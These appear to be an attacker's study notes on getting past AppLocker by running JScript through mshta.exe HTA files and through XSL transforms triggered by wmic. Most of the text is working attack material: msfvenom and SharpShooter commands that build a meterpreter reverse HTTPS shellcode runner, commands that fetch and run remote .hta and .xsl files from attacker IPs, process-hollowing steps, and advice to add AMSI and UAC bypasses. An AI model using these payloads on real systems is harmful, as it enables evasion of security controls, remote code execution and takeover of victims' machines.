- Applocker will block jscript that isn't in a whitelisted folder or has a whitelisted hash/signature

### Method 1: MSHTA

    //works best w/ IE
    //execute .hta files (w/ embedded Jscript or VBS) with mshta.exe
    //**can run via HTTP/url

    //Shortcut File Method:  Create w/ Location:  C:\Windows\System32\mshta.exe http://192.168.1.1/test.hta

    //SharpShooter to generate .hta shellcode runner - OR DotNetToJScript to generate code, then place in HTA file
        msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f raw -o /tmp/cshcode
        sudo python2 SharpShooter.py --payload hta --output foo --stageless --rawscfile /tmp/cshcode --smuggle --template mcafee --dotnetver 4
            C:\Windows\System32\mshta.exe http://192.168.45.193/foo.hta

    //Example HTA file w/ JScript:
        <html> 
        <head> 
        <script language="JScript">
        var shell = new ActiveXObject("WScript.Shell");
        var res = shell.Run("cmd.exe");
        </script>
        </head> 
        <body>
        <script language="JScript">
        self.close();
        </script>
        </body> 
        </html>

### Method 2: XSL Transform (XSLT)

    //execution of embedded JScript when transforming XML to XHTML (Squiblytwo attack)

    //**trigger via http:  wmic process get brief /format:"http://192.168.45.193/test.xsl"
        //can make into shortcut file
        
    //improve w/ DotNetToJScript
        .\DotNetToJScript.exe ExampleAssembly_Hollower_base.dll --lang=Jscript --ver=v4 -o baseHollow.js
            //then copy jscript contents into test.xsl
        //can also add UAC bypass, etc.
        //copy Hollower into it

    //Example File (test.xsl):
    //***add amsi bypass to top of script
    //trigger:  wmic process get brief /format:"http://192.168.45.193/test.xsl"
        //can also make into shortcut file

        <?xml version='1.0'?>
        <stylesheet version="1.0"
        xmlns="http://www.w3.org/1999/XSL/Transform"
        xmlns:ms="urn:schemas-microsoft-com:xslt"
        xmlns:user="http://mycompany.com/mynamespace">
        <output method="text"/>
        <ms:script implements-prefix="user" language="JScript">
        <![CDATA[
        var r = new ActiveXObject("WScript.Shell");
        r.Run("cmd.exe");
        ]]>
        </ms:script>
        </stylesheet>